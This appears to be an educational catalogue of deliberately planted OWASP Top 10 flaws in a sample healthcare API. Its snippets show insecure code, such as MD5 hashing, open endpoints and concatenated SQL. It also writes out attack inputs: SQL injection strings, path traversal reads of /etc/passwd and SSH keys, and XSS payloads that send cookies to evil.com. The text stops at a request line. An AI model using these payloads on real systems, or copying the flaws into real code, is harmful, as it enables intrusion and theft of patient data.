# Vulnerable Configuration — MediConnect API

Branch: `vulnerable` | Purpose: OWASP Top 10:2025 education / attack demonstration

> Vulnerability category tags throughout this document and all source-code comments map to the **OWASP Top 10:2025** list:
> `[A01]` Broken Access Control · `[A02]` Security Misconfiguration · `[A03]` Software Supply Chain Failures · `[A04]` Cryptographic Failures · `[A05]` Injection · `[A06]` Insecure Design · `[A07]` Authentication Failures · `[A08]` Software or Data Integrity Failures · `[A09]` Security Logging and Alerting Failures · `[A10]` Mishandling of Exceptional Conditions

---

## Added Files

### `docker-compose.yml`

Starts the local environment with two services:

| Service | Image | Port | Credentials |
|---|---|---|---|
| MySQL 8.0 | `mysql:8.0` | `3306` | root / root |
| phpMyAdmin | `phpmyadmin:latest` | `8082` | root / root |

```bash
docker-compose up -d
```

---

### `src/main/resources/application.yaml`

Full application configuration with intentional vulnerabilities marked `[A04]`.

#### Vulnerabilities

**1. Hardcoded database credentials [A04]**
```yaml
datasource:
  username: root
  password: root
```
Password visible in a plain-text configuration file committed to the repository.

---

**2. SQL schema leakage via logs [A04]**
```yaml
jpa:
  show-sql: true
  properties:
    hibernate:
      format_sql: true
logging:
  level:
    org.hibernate.SQL: DEBUG
    org.hibernate.type.descriptor.sql.BasicBinder: TRACE
```
Complete SQL queries with bound parameters are printed to logs — reveals database schema and data.

---

**3. Destructive schema changes [A04]**
```yaml
jpa:
  hibernate:
    ddl-auto: update
```
Hibernate automatically alters the database schema on startup — risk of data loss, bypasses Flyway migration control.

---

**4. Actuator endpoints publicly exposed [A04]**
```yaml
management:
  endpoints:
    web:
      exposure:
        include: '*'
  endpoint:
    health:
      show-details: always
    env:
      show-values: always
```
All Actuator endpoints accessible without authentication:
- `/actuator/env` — environment variables and passwords
- `/actuator/heapdump` — full JVM process memory dump
- `/actuator/beans` — internal Spring application context
- `/actuator/mappings` — all registered URL routes

---

**5. Stack trace exposed to client [A04]**
```yaml
server:
  error:
    include-stacktrace: always
    include-message: always
    include-exception: true
```
Internal Java stack trace returned in HTTP error responses — reveals file paths, class names and library versions.

---

**6. Thymeleaf cache disabled [A04]**
```yaml
thymeleaf:
  cache: false
```
Supports exploration of Server-Side Template Injection (SSTI) vulnerabilities.

---

## Flyway Migrations — `src/main/resources/db/migration/`

### Table Schema

| Migration | Table | Description |
|---|---|---|
| V1 | `users` | username, email, password_hash, role, active, failed_login_attempts, locked_until |
| V2 | `patients` | user_id FK, insurance_number, date_of_birth, blood_type, allergies, emergency_contact |
| V3 | `doctors` | user_id FK, specialty, license_number, hospital, phone, bio |
| V4 | `appointments` | patient_id FK, doctor_id FK, status ENUM, requested_date, notes |
| V5 | `medical_records` | patient_id FK, doctor_id FK, diagnosis, prescription, attachment_path |
| V6 | `lab_results` | patient_id FK, lab_tech_id FK, test_name, result_value, status ENUM |
| V7 | `prescriptions` | medical_record_id FK, medication_name, dosage, status ENUM, dispensed_at |
| V8 | `messages` | sender_id FK, receiver_id FK, content TEXT, sent_at, read_at |
| V9 | `audit_logs` | user_id FK, action, entity_type, ip_address, user_agent, details |
| V10 | seed data | admin + patient1 + doctor1 with MD5 passwords |

### Vulnerabilities in Migrations

**7. PII stored as plaintext without encryption [A06] — V2**
```sql
insurance_number  VARCHAR(50),
date_of_birth     DATE,
blood_type        VARCHAR(5),
allergies         TEXT,
emergency_contact VARCHAR(255)
```
Sensitive patient health data stored unencrypted — directly readable from the database.

---

**8. No content_hash for medical records [A08] — V5**
```sql
-- content_hash column intentionally omitted
attachment_path VARCHAR(500)
```
Without a hash it is impossible to detect tampering with attached files or verify the integrity of diagnoses and prescriptions.

---

**9. Stored XSS — messages.content without sanitization [A05] — V8**
```sql
content TEXT  -- raw HTML/JS, no escaping
```
Stored content is displayed without processing — an attacker can inject a `<script>` tag that executes for every recipient.

---

**10. MD5 seed passwords without salt [A04] — V10**
```sql
-- admin123  → MD5 → 0192023a7bbd73250516f069df18b500
-- 12345     → MD5 → 827ccb0eea8a706c4c34a16891f84e7b
-- password  → MD5 → 5f4dcc3b5aa765d61d8327deb882cf99
```
All three values exist in public rainbow tables — passwords are trivially recoverable.

---

## JPA Entities, Repositories and DTOs

### New Files

| Package | Files |
|---|---|
| `com.mediconnect.enums` | `Role`, `AppointmentStatus`, `LabResultStatus`, `PrescriptionStatus` |
| `com.mediconnect.entity` | `User`, `Patient`, `Doctor`, `Appointment`, `MedicalRecord`, `LabResult`, `Prescription`, `Message`, `AuditLog` |
| `com.mediconnect.repository` | One repository per entity with custom query methods |
| `com.mediconnect.dto` | One DTO per entity — same for request and response |

`MediconnectApiApplication` updated with `scanBasePackages`, `@EntityScan` and `@EnableJpaRepositories` for `com.mediconnect`.

### Vulnerabilities

**11. passwordHash exposed in API response [A06] — `User.java`, `UserDto.java`**
```java
// No @JsonIgnore — password hash returned in every GET /users/{id} response
private String passwordHash;
```

---

**12. PII fields exposed in API response without masking [A06] — `Patient.java`, `PatientDto.java`**
```java
// All fields returned as plain text — insurance, DOB, blood type, allergies
private String insuranceNumber;
private LocalDate dateOfBirth;
private String bloodType;
private String allergies;
private String emergencyContact;
```

---

**13. Mass Assignment — same DTO for request and response [A07] — all `*Dto.java`**

Examples of privileged fields a client can set:

| DTO | Dangerous field | Effect |
|---|---|---|
| `UserDto` | `role`, `active`, `failedLoginAttempts`, `lockedUntil` | Privilege escalation, account unban |
| `PatientDto` | `userId` | Profile hijacking |
| `AppointmentDto` | `status` | Direct appointment approval |
| `PrescriptionDto` | `status`, `pharmacistId` | Fraudulent medication dispensing |
| `MessageDto` | `senderId` | Message sender spoofing |
| `AuditLogDto` | `userId`, `ipAddress` | Audit trail manipulation |

---

**14. XSS — `Message.content` without sanitization [A05] — `Message.java`, `MessageDto.java`**
```java
// Content stored and returned without processing — Stored XSS
private String content;
```

---

**15. File integrity unverifiable [A08] — `MedicalRecord.java`, `MedicalRecordDto.java`**
```java
// No contentHash — attachment tampering is undetectable
private String attachmentPath;
```

---

## Security Layer — `JwtUtil`, `PasswordUtils`, `SecurityConfig`

### New Files

| File | Description |
|---|---|
| `security/JwtUtil.java` | JWT token generation and validation |
| `security/PasswordUtils.java` | MD5 password hashing without salt |
| `security/SecurityConfig.java` | Spring Security configuration — all endpoints open |

`pom.xml`: added `spring-boot-starter-security`.

### Vulnerabilities

**16. Hardcoded JWT secret in source code [A04][A06] — `JwtUtil.java`**
```java
private static final String SECRET = "mediconnect-super-secret-2024";
```
Visible in the repository — anyone can sign arbitrary tokens (e.g. `"role": "ADMIN"`).

---

**17. JWT key below 256 bits — WeakKeyException bypassed [A04] — `JwtUtil.java`**
```java
byte[] keyBytes = Arrays.copyOf(SECRET.getBytes(StandardCharsets.UTF_8), 32);
return new SecretKeySpec(keyBytes, "HmacSHA256"); // zero-padding instead of a strong key
```
JJWT's minimum key length check bypassed by manually padding the key with zero bytes.

---

**18. JWT token valid for 30 days [A07] — `JwtUtil.java`**
```java
private static final long EXPIRATION_MS = 30L * 24 * 60 * 60 * 1000;
```
720-hour attack window — a stolen token remains valid for a very long time. Recommended: 15–60 minutes.

---

**19. Algorithm Confusion attack [A07] — `JwtUtil.java`**
```java
// No requireAlgorithm() or allowedAlgorithms() — parser accepts alg from the header
Jwts.parser().verifyWith(...).build().parseSignedClaims(token)
```
An attacker can attempt to replace the `alg` header (`"none"`, `"RS256"`) to bypass signature verification. Further amplified by JJWT CVE-2024-31033 (version 0.12.3 in pom.xml).

---

**20. MD5 without salt — rainbow table attack [A06] — `PasswordUtils.java`**
```java
MessageDigest.getInstance("MD5")  // no salt, no iterations
```
Identical passwords → identical hashes. Billions of MD5 hashes available in public rainbow tables.

---

**21. Timing attack on password comparison [A06] — `PasswordUtils.java`**
```java
return hashPassword(rawPassword).equals(hashedPassword); // not timing-safe
```
`String.equals()` returns `false` as soon as it finds the first differing character — response-time measurement can reveal correct characters.

---

**22. All endpoints unauthenticated [A01] + CSRF disabled [A06] — `SecurityConfig.java`**
```java
.csrf(AbstractHttpConfigurer::disable)
.authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
```
No endpoint requires authentication. CSRF protection and security headers (HSTS, CSP, X-Frame-Options) disabled.

---

## Auth Controller — `AuthController`, `AuthService`, `RegisterRequest`, `LoginRequest`, `UserPrincipal`

### New Files

| File | Description |
|---|---|
| `dto/RegisterRequest.java` | username, email, password, role — no validation |
| `dto/LoginRequest.java` | username, password |
| `security/UserPrincipal.java` | `UserDetails` wrapper around `User` entity for `JwtUtil` |
| `service/AuthService.java` | Registration and login logic with intentional vulnerabilities |
| `controller/AuthController.java` | `POST /api/auth/register`, `POST /api/auth/login` |

### Vulnerabilities

**23. Mass Assignment — role taken directly from request body [A07]**
```java
// RegisterRequest.java
private String role;  // client sends "ADMIN" → receives an admin account

// AuthService.java
.role(Role.valueOf(request.getRole()))  // no server-side validation
```

---

**24. No password complexity validation [A07]**
```java
// RegisterRequest.java — no @Size, @Pattern, @NotBlank
private String password;
// Accepted: {"password": "1"}
```

---

**25. User Enumeration — distinct error messages on both register and login [A07]**
```java
// AuthService.register() — confirms which usernames and emails are already registered
if (userRepository.existsByUsername(username)) {
    throw new RuntimeException("Username already taken: " + username);  // username exists
}
if (userRepository.existsByEmail(email)) {
    throw new RuntimeException("Email already registered: " + email);   // email exists
}

// AuthService.login() — each message reveals different information to the attacker
throw new RuntimeException("User not found: " + username);         // username does not exist
throw new RuntimeException("Invalid password");                    // username exists
throw new RuntimeException("Account is locked until " + time);    // exists + password correct
```
`POST /api/auth/register` returns HTTP 409 with `{"error":"Username already taken: alice"}`.
An attacker can enumerate all registered usernames by attempting registrations in a loop — no rate limiting, no CAPTCHA, no lockout.

---

**26. JWT in response body — not in HttpOnly cookie [A06]**
```java
// AuthController.java — token accessible to JavaScript
return ResponseEntity.ok(Map.of("token", token));
```
Correct approach: `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict`

---

**27. No rate limiting on /login [A07]**

Endpoint `POST /api/auth/login` has no protection against brute-force or credential stuffing attacks — unlimited attempts, no lockout, no CAPTCHA, no IP throttling.

---

## Security Infrastructure — `SecurityConfig`, `JwtAuthenticationFilter`, `CustomUserDetailsService`

### New Files

| File | Description |
|---|---|
| `security/CustomUserDetailsService.java` | `UserDetailsService` implementation — loads `User` from DB, wraps in `UserPrincipal` |
| `security/JwtAuthenticationFilter.java` | `OncePerRequestFilter` — reads JWT from `Authorization` header, sets `SecurityContext` |
| `security/SecurityConfig.java` | Full Spring Security config replacing the earlier stub |

### Vulnerabilities

**28. CSRF fully disabled [A01] — `SecurityConfig.java`**
```java
.csrf(AbstractHttpConfigurer::disable)
```
Any cross-origin POST/PUT/DELETE request executes without a CSRF token.

---

**29. Admin routes open to all — no role check [A01] — `SecurityConfig.java`**
```java
.requestMatchers("/api/admin/**").permitAll()  // should be hasRole("ADMIN")
```
Any unauthenticated request reaches admin endpoints without authentication or authorization.

---

**30. Wildcard CORS policy [A05] — `SecurityConfig.java`**
```java
config.setAllowedOrigins(List.of("*"));   // any domain
config.setAllowedMethods(List.of("*"));   // GET, POST, DELETE, PATCH...
config.setAllowedHeaders(List.of("*"));   // Authorization, Cookie, X-Custom-*
```
Any attacker-controlled domain can make authenticated cross-origin requests to the API.

---

**31. All security response headers disabled [A04] — `SecurityConfig.java`**
```java
.headers(AbstractHttpConfigurer::disable)
```
Removes: `Strict-Transport-Security`, `X-Frame-Options` (clickjacking), `X-Content-Type-Options` (MIME sniffing), `Content-Security-Policy`, `Referrer-Policy`.

---

**32. `NoOpPasswordEncoder` registered — plain-text comparison path [A04] — `SecurityConfig.java`**
```java
return NoOpPasswordEncoder.getInstance();
```
The `DaoAuthenticationProvider` internal path compares passwords without hashing. The stored MD5 hex strings are treated as the "plain-text" password.

---

**33. Token expiry skipped for specific paths [A07] — `JwtAuthenticationFilter.java`**
```java
private static final List<String> SKIP_EXPIRY_PATHS = List.of(
    "/api/public/", "/api/legacy/", "/api/reports/"
);
// For matching paths: setAuthentication() called without validateToken()
```
Expired tokens (e.g. from months ago) are fully accepted on these routes.

---

**34. Token parsing exceptions silently swallowed [A07] — `JwtAuthenticationFilter.java`**
```java
} catch (Exception e) {
    // swallowed — request continues as unauthenticated
}
```
Malformed, tampered or otherwise invalid tokens produce no error response. Combined with `permitAll()`, the request still reaches the controller.

---

**35. User Enumeration in `UserDetailsService` [A07] — `CustomUserDetailsService.java`**
```java
throw new UsernameNotFoundException("User not found: " + username);
```
With `server.error.include-message=always` set in `application.yaml`, this message reaches the HTTP response and confirms whether a username exists.

---

---

## User Controller — `UserController`, `UserService`

### New Files

| File | Description |
|---|---|
| `controller/UserController.java` | `GET /api/users`, `GET /{id}`, `PUT /{id}/role`, `GET /delete/{id}` |
| `service/UserService.java` | CRUD operations: `findAll`, `findById`, `updateRole`, `deleteById` |

### Vulnerabilities

**36. IDOR — GET /api/users/{id} without authorization check [A01] — `UserController.java`**
```java
// [A01] No check that the caller owns or is authorized to view this id
@GetMapping("/{id}")
public ResponseEntity<UserDto> getUserById(@PathVariable Long id) {
    return ResponseEntity.ok(userService.findById(id));
}
```
Patient A can retrieve the full profile of Patient B (including `passwordHash`, `role`, `failedLoginAttempts`, `lockedUntil`) without any authorization. The requested `id` is never compared against the identity in the JWT token.

---

**37. passwordHash exposed in API response [A06] — `UserService.java`, `UserDto.java`**
```java
// UserService.toDto() — explicitly maps hash into the response
.passwordHash(user.getPasswordHash())   // [A06] exposed

// UserDto.java — no @JsonIgnore
private String passwordHash;
```
Every GET response includes the MD5 password hash. An attacker who obtains the hash can immediately look it up in public rainbow tables.

---

**38. Mass Assignment — PUT /api/users/{id}/role accepts role without server-side validation [A01] — `UserController.java`**
```java
@PutMapping("/{id}/role")
public ResponseEntity<UserDto> updateUserRole(
        @PathVariable Long id,
        @RequestBody Map<String, String> body) {
    String role = body.get("role");   // taken directly from the request body
    return ResponseEntity.ok(userService.updateRole(id, role));
}
```
```java
// UserService.java — no whitelist, no check of the caller's own role
user.setRole(Role.valueOf(role));  // {"role":"ADMIN"} → privilege escalation
```
Any user (or unauthenticated caller, given `permitAll()`) can send `{"role":"ADMIN"}` and promote any account to administrator.

---

**39. DELETE operation implemented as @GetMapping [A07] — `UserController.java`**
```java
// [A07] GET /api/users/delete/{id} — destructive operation via an idempotent HTTP method
@GetMapping("/delete/{id}")
public ResponseEntity<Void> deleteUser(@PathVariable Long id) {
    userService.deleteById(id);
    return ResponseEntity.noContent().build();
}
```
GET is idempotent and cached by browsers, proxies, and CDNs. An attacker can trick a victim into deleting a user account with a simple `<img src="https://api.mediconnect.com/api/users/delete/5">` tag — no CSRF token required.

---

**40. GET /api/users returns all users to all roles [A01] — `UserController.java`**
```java
// [A01] No role check — PATIENT, DOCTOR, LAB_TECH, PHARMACIST, and unauthenticated
//        callers all receive the complete user list including passwordHash
@GetMapping
public ResponseEntity<List<UserDto>> getAllUsers() {
    return ResponseEntity.ok(userService.findAll());
}
```
The endpoint verifies neither the role nor the identity of the caller. The full user list (including password hashes) is available without any authentication.

---

## Appointment Controller — `AppointmentController`, `AppointmentService`

### New Files

| File | Description |
|---|---|
| `controller/AppointmentController.java` | `GET /api/appointments`, `GET /{id}`, `PUT /{id}/status`, `GET /{id}/pdf`, `POST /` |
| `service/AppointmentService.java` | `searchAppointments` (SQLi), `findById` (IDOR), `updateStatus` (no state machine), `generatePdf` (no checksum), `create` |

### Vulnerabilities

**41. SQL Injection — GET /api/appointments?doctorName= [A05] — `AppointmentService.java`**
```java
// [A05] Direct string concatenation — no PreparedStatement placeholder
String sql = "SELECT a.id, a.patient_id, a.doctor_id, a.status, " +
             "       a.requested_date, a.notes, a.created_at " +
             "FROM appointments a " +
             "JOIN doctors d ON a.doctor_id = d.id " +
             "JOIN users u ON d.user_id = u.id " +
             "WHERE u.username LIKE '%" + doctorName + "%'";
jdbcTemplate.query(sql, rowMapper);
```
Attack examples:
- `?doctorName=' OR '1'='1` → returns all appointments without any filter
- `?doctorName=' UNION SELECT username,password_hash,3,4,5,6,7 FROM users --` → dumps the users table through the appointment response
- `?doctorName='; DROP TABLE appointments; --` → table destruction

---

**42. IDOR — GET /api/appointments/{id} without ownership check [A01] — `AppointmentController.java`**
```java
// [A01] No comparison of the appointment id against the caller's identity
@GetMapping("/{id}")
public ResponseEntity<AppointmentDto> getAppointmentById(@PathVariable Long id) {
    return ResponseEntity.ok(appointmentService.findById(id));
}
```
Patient A can retrieve Patient B's appointment by iterating ID values. There is no check that the user in the token is actually the patient or the doctor on that specific appointment.

---

**43. Missing state machine — PUT /api/appointments/{id}/status [A02] — `AppointmentService.java`**
```java
// [A02] No check of the previous state, no role enforcement
// Allowed business transitions: REQUESTED → APPROVED → COMPLETED
//                               REQUESTED → CANCELLED
// What this enables:
//   COMPLETED → REQUESTED  (re-opens a finished appointment)
//   CANCELLED → APPROVED   (approves a cancelled slot)
//   COMPLETED → APPROVED   (billing fraud — re-approves a completed visit)
appointment.setStatus(AppointmentStatus.valueOf(status));
```
A patient can send `{"status":"APPROVED"}` and approve their own appointment. An attacker can exploit `COMPLETED → APPROVED` for billing manipulation.

---

**44. PDF served without Content-MD5 or checksum [A08] — `AppointmentController.java`**
```java
// [A08] Content-MD5 intentionally omitted
// Secure implementation would add:
//   headers.set("Content-MD5", Base64.getEncoder().encodeToString(
//       MessageDigest.getInstance("MD5").digest(pdfBytes)));
return ResponseEntity.ok()
        .headers(headers)   // no Content-MD5, no content-hash-based ETag
        .body(pdfBytes);
```
Medical PDF documents (diagnosis, medication, appointment date) are served without any integrity control. A MITM attacker or a compromised CDN can silently modify the document and the client has no mechanism to detect the tampering.

---

## Medical Record Controller — `MedicalRecordController`, `MedicalRecordService`

### New Files

| File | Description |
|---|---|
| `controller/MedicalRecordController.java` | `POST /api/medical-records`, `GET /{id}`, `POST /{id}/attachment`, `GET /{id}/attachment` |
| `service/MedicalRecordService.java` | `create` (A01), `uploadAttachment` (A03+A08), `downloadAttachment` (A03), `findById`, `findByPatientId` |

### Vulnerabilities

**45. Broken Access Control — POST /api/medical-records without doctor-patient assignment check [A01] — `MedicalRecordService.java`**
```java
// [A01] No verification that the doctor has any relationship with the patient
// Missing: appointmentRepository.existsByDoctorIdAndPatientId(doctorId, patientId)
// Missing: care-plan membership check
MedicalRecord record = MedicalRecord.builder()
        .patient(patient)   // any patient
        .doctor(doctor)     // any doctor
        ...
        .build();
```
Doctor D can create a medical record for Patient P with whom they have never had an appointment. An attacker with the DOCTOR role can fabricate medical records for any user in the system.

---

**46. Unrestricted File Upload — POST /api/medical-records/{id}/attachment [A05] — `MedicalRecordService.java`**
```java
// [A05] No extension, MIME type, magic-byte, or file-size validation
String filename = file.getOriginalFilename();   // fully controlled by the attacker
String storagePath = uploadDir + filename;       // direct concatenation
Path destination = Paths.get(storagePath);
Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
```
Accepted uploads: `.php`, `.jsp`, `.sh`, `.exe`, `application/octet-stream`, `text/html`. If the server runs PHP/CGI, an attacker can achieve remote code execution by uploading a web shell.

---

**47. Path Traversal (write) — getOriginalFilename() without sanitization [A05] — `MedicalRecordService.java`**
```java
// Attacker sends: filename = "../../etc/cron.d/backdoor"
// storagePath   = "/tmp/mediconnect/uploads/../../etc/cron.d/backdoor"
// After resolution → writes to /etc/cron.d/backdoor
String storagePath = uploadDir + filename;   // [A05] no normalize(), no startsWith() check
```
Combined with `REPLACE_EXISTING`, an attacker can overwrite system files (cron jobs, SSH authorized_keys, /etc/passwd) if the JVM process has sufficient permissions.

---

**48. Path Traversal (read) — filePath query parameter without canonical validation [A05] — `MedicalRecordController.java`, `MedicalRecordService.java`**
```java
// GET /api/medical-records/1/attachment?filePath=/etc/passwd
// GET /api/medical-records/1/attachment?filePath=../../../root/.ssh/id_rsa
// GET /api/medical-records/1/attachment?filePath=/proc/self/environ

// MedicalRecordService.downloadAttachment():
Path path = Paths.get(filePath);      // [A05] verbatim — no boundary check
return Files.readAllBytes(path);      // reads any file accessible to the JVM process
```
No comparison against `uploadDir`, no `toAbsolutePath().normalize().startsWith(base)` check. An attacker can read arbitrary files from the server, including configuration files, private keys, and user data.

---

**49. Filesystem path returned in response [A04] — `MedicalRecordController.java`**
```java
return ResponseEntity.ok(Map.of("path", storedPath));
// Response: {"path": "/tmp/mediconnect/uploads/report.pdf"}
```
The full server-side filesystem path is returned to the client, revealing the directory structure and aiding path traversal payload construction.

---

**50. content_hash not computed at upload time [A08] — `MedicalRecordService.java`**
```java
Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
// Secure: String hash = DigestUtils.sha256Hex(file.getBytes());
//         record.setContentHash(hash);   // MedicalRecord entity has no such field
```
Neither the `MedicalRecord` entity nor migration `V5` contain a `content_hash` column. Any subsequent modification of a medical document (diagnosis, medication dosage) is completely undetectable.

---

## Lab Result Controller — `LabResultController`, `LabResultService`

### New Files

| File | Description |
|---|---|
| `controller/LabResultController.java` | `GET /api/lab-results/search`, `GET /{id}`, `POST /{id}/file`, `GET /{id}/file`, `POST /` |
| `service/LabResultService.java` | `searchLabResults` (4×SQLi), `findById` (IDOR), `saveAttachment` (A03), `downloadFile` (A03) |

### Vulnerabilities

**51. SQL Injection — GET /api/lab-results/search with 4 parameters [A05] — `LabResultService.java`**

Three string parameters (concatenation inside single quotes):
```java
"WHERE lr.test_name       LIKE '%" + testName + "%' " +   // [A05] string injection
"AND   lr.reference_range LIKE '%" + testCode + "%' " +   // [A05] string injection
"AND   lr.status          LIKE '%" + status   + "%' " +   // [A05] string injection
```
Attack examples:
- `?testName=' OR '1'='1` → returns all lab results
- `?status=' UNION SELECT username,password_hash,3,4,5,6,7,8,9,10,11 FROM users --` → dumps the users table

Numeric parameter `patientId` — **no surrounding quotes (UNION attack without closing a string)**:
```java
"AND   lr.patient_id = " + patientId   // [A05] numeric — attacker never needs to close a quote
```
Attack:
```
?patientId=0 UNION SELECT id,patient_id,lab_tech_id,test_name,
             password_hash,email,NULL,role,NOW(),notes,NULL
             FROM users u JOIN patients p ON u.id=p.user_id --
```
Dumps the `users` table through the `resultValue`/`unit` response fields without any string escaping. This is the most dangerous form of SQL injection because the WHERE clause appears "safe" to a developer who assumes numeric values cannot be an injection vector.

---

**52. IDOR — GET /api/lab-results/{id} without ownership check [A01] — `LabResultController.java`**
```java
// [A01] No check that the caller is the patient who owns the result
//        or the doctor who ordered the test
@GetMapping("/{id}")
public ResponseEntity<LabResultDto> getById(@PathVariable Long id) {
    return ResponseEntity.ok(labResultService.findById(id));
}
```
By iterating IDs (`/api/lab-results/1`, `/2`, `/3`...) an attacker can retrieve lab results for all patients, including diagnoses, result values, and reference ranges.

---

**53. Unrestricted File Upload + predictable filename [A05] — `LabResultService.java`**
```java
// [A05] getOriginalFilename() — fully controlled by the attacker
String filename    = file.getOriginalFilename();   // e.g. "bloodwork.pdf" — always the same
String storagePath = uploadDir + filename;          // no UUID prefix, no randomization
Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
```
Issues:
1. **Predictable filename** — the attacker knows the full path as soon as they know the naming convention; `REPLACE_EXISTING` allows overwriting legitimate files
2. **Unrestricted extension** — `.php`, `.jsp`, `.sh`, `.exe` accepted without validation
3. **Path Traversal write** — `filename = "../../etc/cron.d/backdoor"` writes outside `uploadDir`

---

**54. Path Traversal (read) — GET /api/lab-results/{id}/file?filePath= [A05] — `LabResultService.java`**
```java
// [A05] filePath — taken verbatim from the query parameter, no boundary check
Path path = Paths.get(filePath);
return Files.readAllBytes(path);   // reads any file accessible to the JVM process
```
Attack examples:
```
GET /api/lab-results/1/file?filePath=/etc/passwd
GET /api/lab-results/1/file?filePath=/proc/self/environ          → exposes DB password from env
GET /api/lab-results/1/file?filePath=../../../root/.ssh/id_rsa
GET /api/lab-results/1/file?filePath=/tmp/mediconnect/uploads/../../application.yaml
```
No `toAbsolutePath().normalize().startsWith(base)` check. No comparison of `filePath` against the stored `lr.attachmentPath`.

---

## Message Controller — `MessageController`, `MessageService`

### New Files

| File | Description |
|---|---|
| `controller/MessageController.java` | `POST /api/messages`, `GET /conversation/{userId}`, `DELETE /{id}`, `GET /inbox/{userId}`, `PATCH /{id}/read` |
| `service/MessageService.java` | `send` (Stored XSS + sender spoofing), `getConversation` (IDOR), `deleteById` (no ownership check) |

### Vulnerabilities

**55. Stored XSS — POST /api/messages stores content without sanitization [A05] — `MessageService.java`**
```java
// [A05] content stored verbatim — <script>, <img onerror=>, <svg onload=> all pass through
Message message = Message.builder()
        .sender(sender)
        .receiver(receiver)
        .content(dto.getContent())   // no Jsoup.clean(), no HTML encoding
        .sentAt(LocalDateTime.now())
        .build();
```
Attack payloads that execute in every recipient's browser:
```json
{"content": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
{"content": "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"}
{"content": "<svg onload=eval(atob('base64_payload'))>"}
```
Enables cookie theft, session hijacking, keylogging, and crypto-mining delivery via a single stored message.

---

**56. Sender spoofing — senderId taken from request body [A07] — `MessageService.java`**
```java
// [A07] senderId is not taken from the JWT SecurityContext
User sender = userRepository.findById(dto.getSenderId())...
// Attacker sends: {"senderId": 5, "receiverId": 2, "content": "..."} → message appears as user 5
```
Any caller can send a message that appears to originate from any other user in the system.

---

**57. IDOR — GET /api/messages/conversation/{userId} without participant check [A01] — `MessageController.java`**
```java
// [A01] viewerId is a query parameter — never verified against the authenticated principal
@GetMapping("/conversation/{userId}")
public ResponseEntity<List<MessageDto>> getConversation(
        @PathVariable Long userId,
        @RequestParam Long viewerId) {
    return ResponseEntity.ok(messageService.getConversation(viewerId, userId));
}
```
Attack:
```
GET /api/messages/conversation/2?viewerId=1  → reads the private conversation between user 1 and user 2
GET /api/messages/conversation/3?viewerId=1  → reads the private conversation between user 1 and user 3
```
By iterating `userId`, an attacker can harvest all private medical conversations in the system.

---

**58. Broken Access Control — DELETE /api/messages/{id} without ownership check [A01] — `MessageService.java`**
```java
// [A01] Missing: if (!message.getSender().getId().equals(currentUserId)) throw Forbidden
messageRepository.findById(id)
        .orElseThrow(() -> new RuntimeException("Message not found: " + id));
messageRepository.deleteById(id);   // deletes any message regardless of caller identity
```
Any caller can delete any message in the system. Combined with `SecurityConfig.permitAll()`, no authentication is required.

---

## Prescription Controller — `PrescriptionController`, `PrescriptionService`

### New Files

| File | Description |
|---|---|
| `controller/PrescriptionController.java` | `POST /api/prescriptions`, `GET /{id}`, `PUT /{id}/dispense`, `PUT /{id}/status` |
| `service/PrescriptionService.java` | `dispense` (no state machine), `updateStatus` (any transition allowed), `create`, `findById`, `findByPatientId` |

### Vulnerabilities

**59. Missing state machine — PUT /api/prescriptions/{id}/dispense allows double dispensing [A02] — `PrescriptionService.java`**
```java
// [A02] No status guard before dispensing
// Allowed business transition: CREATED → DISPENSED (once)
// What this allows:
//   DISPENSED → DISPENSED  (double dispensing — duplicate drug supply / billing fraud)
//   CANCELLED → DISPENSED  (dispensing a voided prescription — pharmaceutical fraud)
prescription.setStatus(PrescriptionStatus.DISPENSED);
prescription.setPharmacist(pharmacist);
prescription.setDispensedAt(LocalDateTime.now());   // overwrites even if already DISPENSED
```
A prescription that has already been dispensed can be dispensed again without any error. This enables duplicate medication supply and double-billing attacks.

---

**60. Missing state machine — PUT /api/prescriptions/{id}/status allows any transition [A02] — `PrescriptionService.java`**
```java
// [A02] PrescriptionStatus.valueOf() accepts any valid enum string
//        without checking the current state or the allowed transition graph
prescription.setStatus(PrescriptionStatus.valueOf(status));
```
Illegal transitions enabled:

| From | To | Attack |
|---|---|---|
| `DISPENSED` | `CREATED` | Re-opens a dispensed prescription for re-use |
| `DISPENSED` | `CANCELLED` | Erases the dispensing audit trail after medication is issued |
| `CANCELLED` | `DISPENSED` | Dispenses a voided prescription |
| `CANCELLED` | `CREATED` | Reactivates a void prescription |

---

**61. Pharmacist identity not verified — PUT /{id}/dispense [A07] — `PrescriptionController.java`**
```java
// [A07] pharmacistId taken from request body — no role or identity check
@PutMapping("/{id}/dispense")
public ResponseEntity<PrescriptionDto> dispense(
        @PathVariable Long id,
        @RequestBody Map<String, Long> body) {
    Long pharmacistId = body.get("pharmacistId");   // attacker supplies any userId
    return ResponseEntity.ok(prescriptionService.dispense(id, pharmacistId));
}
```
An attacker can attribute a dispensing event to any user by supplying an arbitrary `pharmacistId`. No check that the referenced user actually holds the `PHARMACIST` role or that the caller is the pharmacist performing the action.

---

## Admin Controller — `AdminController`, `AdminService`

### New Files

| File | Description |
|---|---|
| `controller/AdminController.java` | `GET /api/admin/users`, `POST /api/admin/users`, `GET /api/admin/config`, `POST /api/admin/logs/clear`, `GET /api/admin/logs` |
| `service/AdminService.java` | `getAllUsers` (A01), `createUser` (A07 Mass Assignment), `getConfig` (A02 env exposure), `clearAllLogs` (A09), `getAllLogs` (A01) |

### Vulnerabilities

**62. Broken Access Control — GET /api/admin/users accessible without ADMIN role [A01] — `AdminController.java`**
```java
// [A01] No @PreAuthorize, no manual role check
// SecurityConfig maps /api/admin/** to permitAll() — no token required at all
@GetMapping("/users")
public ResponseEntity<List<UserDto>> getAllUsers() {
    return ResponseEntity.ok(adminService.getAllUsers());
}
```
Any caller — unauthenticated, PATIENT, LAB_TECH — receives the full user list including `passwordHash`, `failedLoginAttempts`, and `lockedUntil`. The `SecurityConfig.permitAll()` on `/api/admin/**` means no JWT is required even for admin-prefixed routes.

---

**63. Mass Assignment — POST /api/admin/users creates accounts with any role [A07] — `AdminService.java`**
```java
// [A07] role taken verbatim from the request body — no whitelist, no enforcement
String rawRole = body.getOrDefault("role", "PATIENT");
User user = User.builder()
        ...
        .role(Role.valueOf(rawRole))   // {"role":"ADMIN"} → fully privileged account
        .build();
```
Attack — create an ADMIN account without any token:
```json
POST /api/admin/users
